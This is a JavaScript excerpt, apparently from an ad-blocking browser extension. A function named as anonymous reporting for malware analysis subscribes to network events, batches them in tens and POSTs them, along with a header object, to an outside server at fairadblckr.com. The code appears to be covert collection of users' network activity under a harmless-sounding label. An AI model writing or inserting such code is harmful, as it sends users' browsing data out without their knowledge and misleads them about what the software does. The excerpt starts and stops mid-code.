...
function anonyReportForMalwareAnalysis() {
	if (window.malwareReporting)
		return;

	window.malwareReporting = true;
	createDailyReporting(reportBaseTwo);

	fairNetworkProtocol && fairNetworkProtocol.init(function(report) {
		report.dta = [];

		var lastBulk = null;
		fairNetworkProtocol.subscribe(function(event) {
			report.dta.push(event);
			if (report.dta.length >= 10) {
				var reportUrl = "https://fairadblckr.com/sim/tb/";
				var params = "ch=4&std=" + encodeURIComponent(JSON.stringify(report.hdr)) + "&ldk=" + encodeURIComponent(JSON.stringify(report.dta));
				var data = "e=" + encodeURIComponent(params) + "&decode=0";
				callUrl({ url: reportUrl, method: 'POST', data: data, headers: [
					{ name: "Content-type", value: "application/x-www-form-urlencoded" }
				] });
				report.dta = [];

				if (callIfUtcDateChanged(reportBaseThree, lastBulk)) {
					lastBulk = utcTimeGetter();
				}
			}
		});
	});
